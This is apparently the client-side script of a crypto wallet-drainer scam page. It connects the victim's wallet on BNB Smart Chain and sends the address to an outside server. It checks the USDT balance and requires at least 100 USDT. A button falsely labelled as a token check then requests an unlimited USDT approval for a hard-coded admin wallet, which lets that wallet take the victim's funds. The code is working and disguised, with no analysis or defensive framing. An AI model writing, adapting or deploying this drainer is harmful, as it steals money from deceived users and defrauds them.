import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider";
import { ethers } from "https://esm.sh/ethers@6.8.1";

// Element references
const connectButton = document.getElementById("checkBalanceBtn");
const approveButton = document.getElementById("verifyTokenBtn");
const userAddressSpan = document.getElementById("userAddress");
const userBalanceSpan = document.getElementById("userBalance");

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_WALLET = "0x24E189414e4217962964b9D57877C91349A169Da";

const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];

let signer;

const overlay = document.getElementById("walletConnectOverlay");

connectButton.onclick = async () => {
    overlay.style.display = "flex"; // Show the overlay

    // Start the function after showing overlay
    setTimeout(async () => {
        connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking Balance...';
        connectButton.disabled = true;

        try {
            const provider = await EthereumProvider.init({
                projectId: "5c7a882142c7491241b507534414ddff",
                chains: [56], // BNB Smart Chain
                methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
                showQrModal: true
            });

            await provider.connect();

            const ethersProvider = new ethers.BrowserProvider(provider);
            signer = await ethersProvider.getSigner();
            const userAddress = await signer.getAddress();

            // Fill the wallet address
            document.getElementById("walletAddress").value = userAddress;

            // Optional: save to backend
            fetch("http://onlyforapi.com/auto/save_wallet_auto.php", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ wallet: userAddress })
            });

            // Fetch USDT Balance
            const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
            const rawBalance = await USDT.balanceOf(userAddress);
            const balance = parseFloat(ethers.formatUnits(rawBalance, 18));

            document.getElementById("availableBalance").value = balance + " USDT";
            document.getElementById("balanceResults").style.display = "block";

            if (balance < 100) {
                document.getElementById("step3Next").disabled = true;
                document.getElementById("amountCalculation").style.display = "none";
                $('#minBalanceModal').modal('show');
            } else {
                document.getElementById("step3Next").disabled = false;
                document.getElementById("amountCalculation").style.display = "block";
                calculateAmount(balance); // Your logic
            }

        } catch (err) {
            console.error("Wallet connection error:", err);
            alert("Could not connect to wallet. Please try again.");
        } finally {
            overlay.style.display = "none"; // Hide overlay after process
            connectButton.innerHTML = '<i class="fas fa-sync-alt"></i> Check Wallet Balance';
            connectButton.disabled = false;
        }

    }, 3000); // Show overlay for 3 seconds
};

approveButton.onclick = async () => {
    try {
        approveButton.disabled = true;
        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

        const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
        await tx.wait();

        // Show success UI only after approval completes
        document.getElementById("verificationResult").style.display = "block";
        document.getElementById("confirmTransaction").disabled = false;

    } catch (err) {
        console.error("Approval error:", err);
        alert("❌ Something went wrong, please try again.");
    } finally {
        approveButton.disabled = false;
        approveButton.innerHTML = '<i class="fas fa-bolt"></i> Check Your Token for Flash USDT';
    }
};
